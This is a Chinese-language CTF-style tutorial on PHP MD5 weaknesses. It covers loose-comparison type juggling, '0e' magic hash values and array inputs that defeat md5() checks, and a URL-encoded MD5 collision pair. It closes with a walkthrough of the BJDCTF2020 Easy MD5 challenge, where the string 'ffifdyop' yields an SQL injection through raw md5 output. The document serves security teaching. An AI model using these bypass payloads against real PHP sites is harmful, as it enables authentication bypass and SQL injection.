# MD5漏洞

## 数字与字符串

```
var_dump(0=='a')

var_dump('0'=='a')
```

前者为ture，后者为false。在php中如果在将字符串转换为整型时，前面是数字，后面是字母的字符串，则取字符串的第一个字母前面的数字。

实例：
```
<?php

if(123=="123abc"){
echo intval("123abc");
}

?>
```


## MD5漏洞

### 如果两个MD5的值进行比较时，这两个值的开头都为0E的话，则它们的hash值会被默认为0，那么在php的比较中两个不同数值的MD5的值进行比较时，就会相同

而hash值开头为0E的数有
```
以下值在md5加密后以0E开头：

    QNKCDZO
    240610708
    s878926199a
    s155964671a
    s214587387a
    s214587387a

以下值在sha1加密后以0E开头：

    sha1(‘aaroZmOk’)
    sha1(‘aaK1STfY’)
    sha1(‘aaO8zKZF’)
    sha1(‘aa3OFF9m’)
```

### php特性
在php中===表示不仅比较两个数值，而且还要比较两个数值的类型
而在MD5加密中，有一个特性：
```
md5([1,2,3])==md5([2,3,4])==null
```
因此如果传入的数值时数组，并且对传入的数组还要进行md5加密，则会实现绕过

实例
```
<?php

if(md5($_GET['a'])===md5($_GET['b'])){

echo "haha";
}
else{
echo "ha";
}
?>
```

### MD5的碰撞

虽然两个数值不同，但是经过md5加密后，数值相同，如果是post提交的话，数值要进行urlencode

下面有两个不同数值的md5相同
```
Param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2


Param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2

```
## 例题

通过sql注入的尝试，发现不行，就用dirmap扫描，好像也扫不不出什么东西，就用bp抓包,发现了sql语句

![BJDCTF2020 Easy MD51](https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/[BJDCTF2020]Easy MD51.jpg)

通过sql语句中
```
password="'".md5($pass,TRUE)."'"
```

可构造exp
```
<?php

echo ("password="."'".md5($_GET['a'],TRUE)."'");

?>
```
可以知道，当输入为ffifdyop，可以得到
```
password=''or'6É]™é!r,ùíb'

```
构造了一句万能语句，从而实现绕过

而后打开页面源码，可以看见一段代码
```
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->
```

可知get提交a[]=1&b[]=2，即可实现绕过

而后又得到了一段代码
```
 <?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
} 
```

由代码中，我们可以再次使用数组绕过，构造param1[]=1&param2[]=2，且用post提交